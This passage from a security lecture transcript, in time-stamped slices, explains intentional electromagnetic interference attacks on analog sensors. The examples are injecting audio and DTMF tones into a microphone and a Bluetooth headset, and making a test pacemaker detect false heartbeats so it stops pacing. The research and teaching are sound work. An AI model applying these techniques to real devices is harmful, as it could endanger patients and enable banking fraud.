was, was this possible at all?</text_slice>
            </slice>
            <slice>
              <time_slice>40:05</time_slice>
              <text_slice>And if so, how hard would it be?</text_slice>
            </slice>
            <slice>
              <time_slice>40:07</time_slice>
              <text_slice>What kind of power
would you need to do it?</text_slice>
            </slice>
            <slice>
              <time_slice>40:10</time_slice>
              <text_slice>And what would be the quality
of the signal that actually</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>reaches the microprocessor?</text_slice>
            </slice>
            <slice>
              <time_slice>40:15</time_slice>
              <text_slice>So the fundamental reason
why this is even possible</text_slice>
            </slice>
            <slice>
              <time_slice>40:18</time_slice>
              <text_slice>is because we're talking
about intentional, as opposed</text_slice>
            </slice>
            <slice>
              <time_slice>40:21</time_slice>
              <text_slice>to accidental
interference, we're</text_slice>
            </slice>
            <slice>
              <time_slice>40:23</time_slice>
              <text_slice>throwing it into the baseband.</text_slice>
            </slice>
            <slice>
              <time_slice>40:24</time_slice>
              <text_slice>So here's an example.</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>Imagine that your
medical device is</text_slice>
            </slice>
            <slice>
              <time_slice>40:29</time_slice>
              <text_slice>designed to accept physiologic
signals in the low hertz.</text_slice>
            </slice>
            <slice>
              <time_slice>40:32</time_slice>
              <text_slice>Like your heart
doesn't beat that fast.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>We're talking a
few hertz or less.</text_slice>
            </slice>
            <slice>
              <time_slice>40:37</time_slice>
              <text_slice>So if your electrodes were to
pick up some high frequency</text_slice>
            </slice>
            <slice>
              <time_slice>40:39</time_slice>
              <text_slice>signals, you'd just put
in some analog filters.</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>You'd say, that
cannot be real, right?</text_slice>
            </slice>
            <slice>
              <time_slice>40:43</time_slice>
              <text_slice>If your heart's
beating that fast,</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>you're probably just
picking up something</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>like an electric mixer while
you're making your lunch.</text_slice>
            </slice>
            <slice>
              <time_slice>40:52</time_slice>
              <text_slice>So similarly you can filter out
pulses in the high frequency.</text_slice>
            </slice>
            <slice>
              <time_slice>40:55</time_slice>
              <text_slice>But if you send interference
that's in the baseband,</text_slice>
            </slice>
            <slice>
              <time_slice>40:58</time_slice>
              <text_slice>those filters are going
to be meaningless.</text_slice>
            </slice>
            <slice>
              <time_slice>41:00</time_slice>
              <text_slice>Because those analog
filters cannot get rid</text_slice>
            </slice>
            <slice>
              <time_slice>41:02</time_slice>
              <text_slice>of if it's in the same frequency
area as what you're expecting.</text_slice>
            </slice>
            <slice>
              <time_slice>41:08</time_slice>
              <text_slice>So it's hard to
filter in the analog.</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>So I'm going to go
through a couple examples.</text_slice>
            </slice>
            <slice>
              <time_slice>41:13</time_slice>
              <text_slice>We're going to start
with a Bluetooth headset,</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>and then work our way
up to a medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>So Denis, he built a bunch
of homebrew dipole antennas</text_slice>
            </slice>
            <slice>
              <time_slice>41:21</time_slice>
              <text_slice>and transmitters and amplifiers.</text_slice>
            </slice>
            <slice>
              <time_slice>41:23</time_slice>
              <text_slice>Now what he's got up here is
you can see he's got a webcam.</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>I guess not too many of us
need to buy these anymore,</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>because they're built in.</text_slice>
            </slice>
            <slice>
              <time_slice>41:31</time_slice>
              <text_slice>But that webcam
has a microphone,</text_slice>
            </slice>
            <slice>
              <time_slice>41:36</time_slice>
              <text_slice>and then it's got
a little USB cable</text_slice>
            </slice>
            <slice>
              <time_slice>41:38</time_slice>
              <text_slice>to deliver the audio
to the computer.</text_slice>
            </slice>
            <slice>
              <time_slice>41:40</time_slice>
              <text_slice>So what he's done is
he's set up the computer</text_slice>
            </slice>
            <slice>
              <time_slice>41:42</time_slice>
              <text_slice>to record the video and
audio and then play it back.</text_slice>
            </slice>
            <slice>
              <time_slice>41:45</time_slice>
              <text_slice>So what's interesting
is-- you'll see this now.</text_slice>
            </slice>
            <slice>
              <time_slice>41:51</time_slice>
              <text_slice>He was in a completely
silent room.</text_slice>
            </slice>
            <slice>
              <time_slice>41:52</time_slice>
              <text_slice>It sort of sounded like this.</text_slice>
            </slice>
            <slice>
              <time_slice>41:53</time_slice>
              <text_slice>All you could hear was
the ventilation system.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>He's got the camera.</text_slice>
            </slice>
            <slice>
              <time_slice>41:58</time_slice>
              <text_slice>He removed the housing,
just so it's easier</text_slice>
            </slice>
            <slice>
              <time_slice>42:00</time_slice>
              <text_slice>to tap in and measure
the interference.</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>And then he's got a
software radio about a meter</text_slice>
            </slice>
            <slice>
              <time_slice>42:06</time_slice>
              <text_slice>away, generating custom
electromagnetic interference.</text_slice>
            </slice>
            <slice>
              <time_slice>42:09</time_slice>
              <text_slice>He writes it in Python, and
then sends over his signals.</text_slice>
            </slice>
            <slice>
              <time_slice>42:13</time_slice>
              <text_slice>So here's what the
computer on the left</text_slice>
            </slice>
            <slice>
              <time_slice>42:17</time_slice>
              <text_slice>thought it heard, even
in this silent room.</text_slice>
            </slice>
            <slice>
              <time_slice>42:20</time_slice>
              <text_slice>[AUDIO PLAYBACK]</text_slice>
            </slice>
            <slice>
              <time_slice>42:21</time_slice>
              <text_slice>[MUSIC WEEZER, "ISLAND IN THE
 SUN"]</text_slice>
            </slice>
            <slice>
              <time_slice>42:30</time_slice>
              <text_slice>[END PLAYBACK]</text_slice>
            </slice>
            <slice>
              <time_slice>42:31</time_slice>
              <text_slice>PROFESSOR: So yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>42:32</time_slice>
              <text_slice>The last time I did that,
somebody in the back</text_slice>
            </slice>
            <slice>
              <time_slice>42:34</time_slice>
              <text_slice>actually started dancing.</text_slice>
            </slice>
            <slice>
              <time_slice>42:37</time_slice>
              <text_slice>So it's actually
relatively high fidelity.</text_slice>
            </slice>
            <slice>
              <time_slice>42:39</time_slice>
              <text_slice>And it actually turns out that
in the manufacturing community,</text_slice>
            </slice>
            <slice>
              <time_slice>42:43</time_slice>
              <text_slice>they're so cheap.</text_slice>
            </slice>
            <slice>
              <time_slice>42:43</time_slice>
              <text_slice>They use really
cheap microphones</text_slice>
            </slice>
            <slice>
              <time_slice>42:46</time_slice>
              <text_slice>with poor frequency responses.</text_slice>
            </slice>
            <slice>
              <time_slice>42:48</time_slice>
              <text_slice>So we actually got
higher quality audio</text_slice>
            </slice>
            <slice>
              <time_slice>42:50</time_slice>
              <text_slice>through interference than
going to the microphone.</text_slice>
            </slice>
            <slice>
              <time_slice>42:53</time_slice>
              <text_slice>So if you ever don't like
your Bluetooth headset</text_slice>
            </slice>
            <slice>
              <time_slice>42:55</time_slice>
              <text_slice>and you want to play
classical music,</text_slice>
            </slice>
            <slice>
              <time_slice>42:57</time_slice>
              <text_slice>just do it with interference.</text_slice>
            </slice>
            <slice>
              <time_slice>42:58</time_slice>
              <text_slice>But don't tell the FCC
I told you to do that,</text_slice>
            </slice>
            <slice>
              <time_slice>43:02</time_slice>
              <text_slice>because you're not supposed to.</text_slice>
            </slice>
            <slice>
              <time_slice>43:03</time_slice>
              <text_slice>But the point is
if you're talking</text_slice>
            </slice>
            <slice>
              <time_slice>43:06</time_slice>
              <text_slice>intentional magnetic
interference,</text_slice>
            </slice>
            <slice>
              <time_slice>43:08</time_slice>
              <text_slice>it's kind of outside
the security model.</text_slice>
            </slice>
            <slice>
              <time_slice>43:11</time_slice>
              <text_slice>And so your processor
just trusts it.</text_slice>
            </slice>
            <slice>
              <time_slice>43:13</time_slice>
              <text_slice>So some interesting
things you can do.</text_slice>
            </slice>
            <slice>
              <time_slice>43:16</time_slice>
              <text_slice>Let's say your office
mate decides to call up</text_slice>
            </slice>
            <slice>
              <time_slice>43:18</time_slice>
              <text_slice>his bank to make some deposits.</text_slice>
            </slice>
            <slice>
              <time_slice>43:21</time_slice>
              <text_slice>Well, you can insert DTMF tones.</text_slice>
            </slice>
            <slice>
              <time_slice>43:23</time_slice>
              <text_slice>That's kind of fun.</text_slice>
            </slice>
            <slice>
              <time_slice>43:24</time_slice>
              <text_slice>So we were just playing around.</text_slice>
            </slice>
            <slice>
              <time_slice>43:26</time_slice>
              <text_slice>You can change the
language as the person's</text_slice>
            </slice>
            <slice>
              <time_slice>43:28</time_slice>
              <text_slice>trying to make deposits
from account to account.</text_slice>
            </slice>
            <slice>
              <time_slice>43:31</time_slice>
              <text_slice>But there's all
just interference.</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>And actually the person
on the Bluetooth headset</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>didn't hear it.</text_slice>
            </slice>
            <slice>
              <time_slice>43:36</time_slice>
              <text_slice>Because remember it's
coming from the person,</text_slice>
            </slice>
            <slice>
              <time_slice>43:42</time_slice>
              <text_slice>so that it doesn't actually
get echoed back to them.</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>But the bank heard it and
made all the transactions.</text_slice>
            </slice>
            <slice>
              <time_slice>43:48</time_slice>
              <text_slice>So there are ways to do this.</text_slice>
            </slice>
            <slice>
              <time_slice>43:51</time_slice>
              <text_slice>It doesn't take a whole
bunch of analog skills.</text_slice>
            </slice>
            <slice>
              <time_slice>43:54</time_slice>
              <text_slice>We're mostly
computer scientists.</text_slice>
            </slice>
            <slice>
              <time_slice>43:55</time_slice>
              <text_slice>But you do need
to somehow convert</text_slice>
            </slice>
            <slice>
              <time_slice>43:59</time_slice>
              <text_slice>the signal you want to have
appear at the microprocessor</text_slice>
            </slice>
            <slice>
              <time_slice>44:01</time_slice>
              <text_slice>into something else
that's easier to transmit.</text_slice>
            </slice>
            <slice>
              <time_slice>44:04</time_slice>
              <text_slice>So the first thing
you can do is think</text_slice>
            </slice>
            <slice>
              <time_slice>44:08</time_slice>
              <text_slice>about just
overwhelming the thing</text_slice>
            </slice>
            <slice>
              <time_slice>44:09</time_slice>
              <text_slice>with a very strong signal.</text_slice>
            </slice>
            <slice>
              <time_slice>44:10</time_slice>
              <text_slice>That's the brute force approach.</text_slice>
            </slice>
            <slice>
              <time_slice>44:12</time_slice>
              <text_slice>It doesn't work so well,
but it works a little bit.</text_slice>
            </slice>
            <slice>
              <time_slice>44:14</time_slice>
              <text_slice>So if you send something
out that matches</text_slice>
            </slice>
            <slice>
              <time_slice>44:16</time_slice>
              <text_slice>the resonant frequency of
that little piece of wire,</text_slice>
            </slice>
            <slice>
              <time_slice>44:18</time_slice>
              <text_slice>yeah, that'll get the
job done to some extent.</text_slice>
            </slice>
            <slice>
              <time_slice>44:22</time_slice>
              <text_slice>The problem is a lot of these
signals are low frequency,</text_slice>
            </slice>
            <slice>
              <time_slice>44:26</time_slice>
              <text_slice>and it's more
difficult to transmit.</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>It's got less power, basically.</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>So it's going to be
harder to send the signal.</text_slice>
            </slice>
            <slice>
              <time_slice>44:32</time_slice>
              <text_slice>So what you really want to do is
send a higher frequency signal,</text_slice>
            </slice>
            <slice>
              <time_slice>44:35</time_slice>
              <text_slice>and it's going to be easier
to deliver the power.</text_slice>
            </slice>
            <slice>
              <time_slice>44:37</time_slice>
              <text_slice>But if you send a really
high frequency signal, that's</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>going to be outside
the baseband,</text_slice>
            </slice>
            <slice>
              <time_slice>44:42</time_slice>
              <text_slice>so all the filters
are going to go at it.</text_slice>
            </slice>
            <slice>
              <time_slice>44:44</time_slice>
              <text_slice>So here's what you do instead.</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>You treat this circuit as an
unintentional demodulator.</text_slice>
            </slice>
            <slice>
              <time_slice>44:51</time_slice>
              <text_slice>So what you do is, we had
that original sine wave</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>we wanted to transmit.</text_slice>
            </slice>
            <slice>
              <time_slice>44:55</time_slice>
              <text_slice>Instead we modulate it onto
a higher frequency sine wave.</text_slice>
            </slice>
            <slice>
              <time_slice>44:58</time_slice>
              <text_slice>And we send it in
to the amplifier,</text_slice>
            </slice>
            <slice>
              <time_slice>45:02</time_slice>
              <text_slice>and eventually it's going
to work its way in because</text_slice>
            </slice>
            <slice>
              <time_slice>45:04</time_slice>
              <text_slice>of sampling theory.</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>You can think about
Nyquist and all that.</text_slice>
            </slice>
            <slice>
              <time_slice>45:07</time_slice>
              <text_slice>So up on the top is
the interfering signal</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
              <text_slice>we're actually sending,
and then on the bottom</text_slice>
            </slice>
            <slice>
              <time_slice>45:14</time_slice>
              <text_slice>is what the microprocessor sees.</text_slice>
            </slice>
            <slice>
              <time_slice>45:16</time_slice>
              <text_slice>Because remember the
analog-to-digital converter</text_slice>
            </slice>
            <slice>
              <time_slice>45:18</time_slice>
              <text_slice>is not continuously sampling.</text_slice>
            </slice>
            <slice>
              <time_slice>45:20</time_slice>
              <text_slice>There's an interrupt
on the processor.</text_slice>
            </slice>
            <slice>
              <time_slice>45:22</time_slice>
              <text_slice>Wake up, take a reading,
wake up, take a reading.</text_slice>
            </slice>
            <slice>
              <time_slice>45:24</time_slice>
              <text_slice>So it's actually
going to sample,</text_slice>
            </slice>
            <slice>
              <time_slice>45:25</time_slice>
              <text_slice>and then try to
infer the signal.</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>So as we're sending out
our really fast signal,</text_slice>
            </slice>
            <slice>
              <time_slice>45:29</time_slice>
              <text_slice>it takes a sample,
it takes a sample,</text_slice>
            </slice>
            <slice>
              <time_slice>45:32</time_slice>
              <text_slice>it takes a sample,
et cetera, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>45:35</time_slice>
              <text_slice>Your microprocessor thinks it
got this nice low frequency</text_slice>
            </slice>
            <slice>
              <time_slice>45:37</time_slice>
              <text_slice>sine wave, but we actually
used a high frequency one,</text_slice>
            </slice>
            <slice>
              <time_slice>45:40</time_slice>
              <text_slice>because that allowed us
to transmit more easily.</text_slice>
            </slice>
            <slice>
              <time_slice>45:44</time_slice>
              <text_slice>So I'm not going to go through
all the nitty-gritties,</text_slice>
            </slice>
            <slice>
              <time_slice>45:46</time_slice>
              <text_slice>but one another kind
of cool way to do</text_slice>
            </slice>
            <slice>
              <time_slice>45:49</time_slice>
              <text_slice>this is to muck around with
the non-linear components</text_slice>
            </slice>
            <slice>
              <time_slice>45:54</time_slice>
              <text_slice>of the circuit.</text_slice>
            </slice>
            <slice>
              <time_slice>45:55</time_slice>
              <text_slice>But this is all about violating
security models, right?</text_slice>
            </slice>
            <slice>
              <time_slice>45:58</time_slice>
              <text_slice>So we're completely violating
what the circuit designer</text_slice>
            </slice>
            <slice>
              <time_slice>46:00</time_slice>
              <text_slice>had intended.</text_slice>
            </slice>
            <slice>
              <time_slice>46:02</time_slice>
              <text_slice>It turns out that
if you send in, say,</text_slice>
            </slice>
            <slice>
              <time_slice>46:06</time_slice>
              <text_slice>in this case you're
sending in 826 megahertz</text_slice>
            </slice>
            <slice>
              <time_slice>46:09</time_slice>
              <text_slice>is the resonant
frequency of our wire.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>But I can't speak that fast.</text_slice>
            </slice>
            <slice>
              <time_slice>46:15</time_slice>
              <text_slice>So what we do is we modulate
our voice on an 826 megahertz</text_slice>
            </slice>
            <slice>
              <time_slice>46:21</time_slice>
              <text_slice>carrier.</text_slice>
            </slice>
            <slice>
              <time_slice>46:22</time_slice>
              <text_slice>Problem is it's going to
get, for instance, all</text_slice>
            </slice>
            <slice>
              <time_slice>46:24</time_slice>
              <text_slice>this replication of the signal.</text_slice>
            </slice>
            <slice>
              <time_slice>46:27</time_slice>
              <text_slice>You're going to
see the frequency.</text_slice>
            </slice>
            <slice>
              <time_slice>46:28</time_slice>
              <text_slice>Here we're looking
at frequency domain.</text_slice>
            </slice>
            <slice>
              <time_slice>46:30</time_slice>
              <text_slice>It gets repeated.</text_slice>
            </slice>
            <slice>
              <time_slice>46:31</time_slice>
              <text_slice>But it turns out because
of the filters built</text_slice>
            </slice>
            <slice>
              <time_slice>46:33</time_slice>
              <text_slice>into most of these
devices, it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>46:35</time_slice>
              <text_slice>going to chop off
the repeated copies.</text_slice>
            </slice>
            <slice>
              <time_slice>46:37</time_slice>
              <text_slice>So the end of the day, what
the microprocessor sees</text_slice>
            </slice>
            <slice>
              <time_slice>46:39</time_slice>
              <text_slice>is our original 1
kilohertz signal</text_slice>
            </slice>
            <slice>
              <time_slice>46:41</time_slice>
              <text_slice>we were trying to send in.</text_slice>
            </slice>
            <slice>
              <time_slice>46:43</time_slice>
              <text_slice>It's been unintentionally
demodulated.</text_slice>
            </slice>
            <slice>
              <time_slice>46:47</time_slice>
              <text_slice>So that's the easiest
example that I've</text_slice>
            </slice>
            <slice>
              <time_slice>46:49</time_slice>
              <text_slice>been able to come
up with to explain</text_slice>
            </slice>
            <slice>
              <time_slice>46:51</time_slice>
              <text_slice>the idea of this
intentional interference.</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>And now we're going to try
to apply it to defibrillators</text_slice>
            </slice>
            <slice>
              <time_slice>46:56</time_slice>
              <text_slice>and medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>46:58</time_slice>
              <text_slice>So again, the defibrillator's
implanted into the clavicle.</text_slice>
            </slice>
            <slice>
              <time_slice>47:02</time_slice>
              <text_slice>And it has these electrodes--
you can kind of see them here--</text_slice>
            </slice>
            <slice>
              <time_slice>47:05</time_slice>
              <text_slice>that go into the
chambers of the heart,</text_slice>
            </slice>
            <slice>
              <time_slice>47:07</time_slice>
              <text_slice>and it's used for both
sensing and actuation.</text_slice>
            </slice>
            <slice>
              <time_slice>47:11</time_slice>
              <text_slice>So it's just a signal.</text_slice>
            </slice>
            <slice>
              <time_slice>47:13</time_slice>
              <text_slice>So this is the time domain, and
this is the Fourier transform,</text_slice>
            </slice>
            <slice>
              <time_slice>47:18</time_slice>
              <text_slice>effectively.</text_slice>
            </slice>
            <slice>
              <time_slice>47:19</time_slice>
              <text_slice>So this is a single
heartbeat, and the heartbeat</text_slice>
            </slice>
            <slice>
              <time_slice>47:23</time_slice>
              <text_slice>is actually quite intricate.</text_slice>
            </slice>
            <slice>
              <time_slice>47:26</time_slice>
              <text_slice>The physicians have
actually labeled</text_slice>
            </slice>
            <slice>
              <time_slice>47:27</time_slice>
              <text_slice>the different components
of the heart rate.</text_slice>
            </slice>
            <slice>
              <time_slice>47:29</time_slice>
              <text_slice>You've got the
QRS complex, which</text_slice>
            </slice>
            <slice>
              <time_slice>47:31</time_slice>
              <text_slice>is typically what you would
think of as the heartbeat.</text_slice>
            </slice>
            <slice>
              <time_slice>47:33</time_slice>
              <text_slice>The actual beat is
this giant R here.</text_slice>
            </slice>
            <slice>
              <time_slice>47:36</time_slice>
              <text_slice>That's the one you'll feel.</text_slice>
            </slice>
            <slice>
              <time_slice>47:38</time_slice>
              <text_slice>But there are also these
other smaller waves,</text_slice>
            </slice>
            <slice>
              <time_slice>47:41</time_slice>
              <text_slice>as your tissue is
energizing and relaxing.</text_slice>
            </slice>
            <slice>
              <time_slice>47:46</time_slice>
              <text_slice>So if do a Fourier transform
on your cardiac rhythm,</text_slice>
            </slice>
            <slice>
              <time_slice>47:49</time_slice>
              <text_slice>you're going to end up
with most of the signal</text_slice>
            </slice>
            <slice>
              <time_slice>47:51</time_slice>
              <text_slice>in the tens of hertz.</text_slice>
            </slice>
            <slice>
              <time_slice>47:53</time_slice>
              <text_slice>You're not going to
see things a whole lot</text_slice>
            </slice>
            <slice>
              <time_slice>47:55</time_slice>
              <text_slice>beyond 100 hertz in a
typical cardiac signal.</text_slice>
            </slice>
            <slice>
              <time_slice>47:59</time_slice>
              <text_slice>So most of these
devices are designed</text_slice>
            </slice>
            <slice>
              <time_slice>48:01</time_slice>
              <text_slice>to filter out things that are
really low frequency or really</text_slice>
            </slice>
            <slice>
              <time_slice>48:04</time_slice>
              <text_slice>high frequency.</text_slice>
            </slice>
            <slice>
              <time_slice>48:05</time_slice>
              <text_slice>But if you choose to insert
intentional electromagnetic</text_slice>
            </slice>
            <slice>
              <time_slice>48:07</time_slice>
              <text_slice>interference on the
baseband, then it</text_slice>
            </slice>
            <slice>
              <time_slice>48:09</time_slice>
              <text_slice>gets through all the
analog circuit filters.</text_slice>
            </slice>
            <slice>
              <time_slice>48:12</time_slice>
              <text_slice>And now the only
approach to [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>48:14</time_slice>
              <text_slice>that would be things more on
the computer science side.</text_slice>
            </slice>
            <slice>
              <time_slice>48:18</time_slice>
              <text_slice>So this is where
my students began</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>to have a little bit of fun.</text_slice>
            </slice>
            <slice>
              <time_slice>48:22</time_slice>
              <text_slice>So we wanted to test this
in as realistic a situation</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>as we could.</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>We couldn't get volunteers.</text_slice>
            </slice>
            <slice>
              <time_slice>48:30</time_slice>
              <text_slice>So instead we discovered there's
actually a national standard.</text_slice>
            </slice>
            <slice>
              <time_slice>48:34</time_slice>
              <text_slice>This is a body.</text_slice>
            </slice>
            <slice>
              <time_slice>48:34</time_slice>
              <text_slice>This is you.</text_slice>
            </slice>
            <slice>
              <time_slice>48:35</time_slice>
              <text_slice>It turns out that we're all
just bags of saline solution.</text_slice>
            </slice>
            <slice>
              <time_slice>48:38</time_slice>
              <text_slice>And so if you have a highly
calibrated saline solution,</text_slice>
            </slice>
            <slice>
              <time_slice>48:40</time_slice>
              <text_slice>that's the best way to
simulate human tissue.</text_slice>
            </slice>
            <slice>
              <time_slice>48:44</time_slice>
              <text_slice>The other thing we've done is
we used the synthetic cadaver.</text_slice>
            </slice>
            <slice>
              <time_slice>48:48</time_slice>
              <text_slice>She's actually
anatomically correct.</text_slice>
            </slice>
            <slice>
              <time_slice>48:50</time_slice>
              <text_slice>She's got all the
same vital organs</text_slice>
            </slice>
            <slice>
              <time_slice>48:52</time_slice>
              <text_slice>as anyone else
would have inside,</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>and a working
circulatory system.</text_slice>
            </slice>
            <slice>
              <time_slice>48:55</time_slice>
              <text_slice>So it has all the surface
properties of the RF.</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>So here we're doing
radiation fluoroscopy</text_slice>
            </slice>
            <slice>
              <time_slice>49:01</time_slice>
              <text_slice>to do 3D imaging-- 4D.</text_slice>
            </slice>
            <slice>
              <time_slice>49:04</time_slice>
              <text_slice>We see light imaging as we're
implanting the electrodes</text_slice>
            </slice>
            <slice>
              <time_slice>49:07</time_slice>
              <text_slice>into our synthetic cadaver.</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>So what we're going
to do now is generate</text_slice>
            </slice>
            <slice>
              <time_slice>49:13</time_slice>
              <text_slice>some electromagnetic
interference</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>and then try to see what
the device is perceiving</text_slice>
            </slice>
            <slice>
              <time_slice>49:17</time_slice>
              <text_slice>as a trustworthy signal.</text_slice>
            </slice>
            <slice>
              <time_slice>49:19</time_slice>
              <text_slice>So a couple ways we did this.</text_slice>
            </slice>
            <slice>
              <time_slice>49:21</time_slice>
              <text_slice>In the saline solution, we used
just a spool of magnet wire.</text_slice>
            </slice>
            <slice>
              <time_slice>49:25</time_slice>
              <text_slice>Here we have the wand that's
reading out the telemetry</text_slice>
            </slice>
            <slice>
              <time_slice>49:28</time_slice>
              <text_slice>to see what the device
thinks it's seeing,</text_slice>
            </slice>
            <slice>
              <time_slice>49:30</time_slice>
              <text_slice>and then another
experimental case.</text_slice>
            </slice>
            <slice>
              <time_slice>49:32</time_slice>
              <text_slice>So I had some leftover
pipes from plumbing,</text_slice>
            </slice>
            <slice>
              <time_slice>49:34</time_slice>
              <text_slice>so we created a dipole antenna.</text_slice>
            </slice>
            <slice>
              <time_slice>49:36</time_slice>
              <text_slice>And on the back there
on that poster board,</text_slice>
            </slice>
            <slice>
              <time_slice>49:39</time_slice>
              <text_slice>we created a 2D
version of a patient.</text_slice>
            </slice>
            <slice>
              <time_slice>49:41</time_slice>
              <text_slice>You can see that's the curvature
of the electrode, that's</text_slice>
            </slice>
            <slice>
              <time_slice>49:43</time_slice>
              <text_slice>the electrode, and
then the pacemaker</text_slice>
            </slice>
            <slice>
              <time_slice>49:46</time_slice>
              <text_slice>is right underneath the tape.</text_slice>
            </slice>
            <slice>
              <time_slice>49:48</time_slice>
              <text_slice>And we're transferring to it.</text_slice>
            </slice>
            <slice>
              <time_slice>49:50</time_slice>
              <text_slice>So here's what the
device thought it saw,</text_slice>
            </slice>
            <slice>
              <time_slice>49:52</time_slice>
              <text_slice>even though it wasn't happening.</text_slice>
            </slice>
            <slice>
              <time_slice>49:53</time_slice>
              <text_slice>So keep in mind this should have
been a flat line, because there</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>is no patient.</text_slice>
            </slice>
            <slice>
              <time_slice>49:57</time_slice>
              <text_slice>There is no heart beating.</text_slice>
            </slice>
            <slice>
              <time_slice>49:58</time_slice>
              <text_slice>So we tried a couple different
signals of interest are we</text_slice>
            </slice>
            <slice>
              <time_slice>50:01</time_slice>
              <text_slice>pulsed a sinusoid.</text_slice>
            </slice>
            <slice>
              <time_slice>50:03</time_slice>
              <text_slice>So that's really a
sine wave, but it's</text_slice>
            </slice>
            <slice>
              <time_slice>50:06</time_slice>
              <text_slice>so fast you can't quite tell.</text_slice>
            </slice>
            <slice>
              <time_slice>50:07</time_slice>
              <text_slice>But we pulsed it
like a heart beat.</text_slice>
            </slice>
            <slice>
              <time_slice>50:09</time_slice>
              <text_slice>So every one second
we sent out a pulse.</text_slice>
            </slice>
            <slice>
              <time_slice>50:12</time_slice>
              <text_slice>And then we also did
one that's modulated.</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>That's a little bit noisier.</text_slice>
            </slice>
            <slice>
              <time_slice>50:17</time_slice>
              <text_slice>So this is a screenshot of
the pacemaker programmer</text_slice>
            </slice>
            <slice>
              <time_slice>50:21</time_slice>
              <text_slice>which tells us live what
telemetry is going out.</text_slice>
            </slice>
            <slice>
              <time_slice>50:24</time_slice>
              <text_slice>And it's hard to read, but
the little green up there,</text_slice>
            </slice>
            <slice>
              <time_slice>50:27</time_slice>
              <text_slice>VP, says that the device sent
out the ventricular pace.</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>This is the pacemaker sending
an artificial heartbeat,</text_slice>
            </slice>
            <slice>
              <time_slice>50:33</time_slice>
              <text_slice>basically, to make
the tissue contract.</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>What's interesting
is when we started</text_slice>
            </slice>
            <slice>
              <time_slice>50:37</time_slice>
              <text_slice>sending our interference,
it got what's</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>called a VS, a
ventricular sense.</text_slice>
            </slice>
            <slice>
              <time_slice>50:42</time_slice>
              <text_slice>The little purple VS,
there's three of them.</text_slice>
            </slice>
            <slice>
              <time_slice>50:44</time_slice>
              <text_slice>So the pacemaker thought
that the heart was</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>beating on its own, so it
chose to inhibit the pacing</text_slice>
            </slice>
            <slice>
              <time_slice>50:48</time_slice>
              <text_slice>to save power.</text_slice>
            </slice>
            <slice>
              <time_slice>50:50</time_slice>
              <text_slice>And then when we turned
off the interference,</text_slice>
            </slice>
            <slice>
              <time_slice>50:52</time_slice>
              <text_slice>the pacing began again.</text_slice>
            </slice>
            <slice>
              <time_slice>50:54</time_slice>
              <text_slice>Similarly over here you see
where the interference starts,</text_slice>
            </slice>
            <slice>
              <time_slice>50:57</time_slice>
              <text_slice>and it's sensing
ventricular sense.</text_slice>
            </slice>
            <slice>
              <time_slice>51:00</time_slice>
              <text_slice>It says, oh, the body's
pacing itself naturally.</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>I don't need to waste my
energy pacing the heart.</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>So we're able to induce
that interference,</text_slice>
            </slice>
            <slice>
              <time_slice>51:08</time_slice>
              <text_slice>and then trick
the microprocessor</text_slice>
            </slice>
            <slice>
              <time_slice>51:09</time_slice>
              <text_slice>into believing the long state.</text_slice>
            </slice>
            <slice>
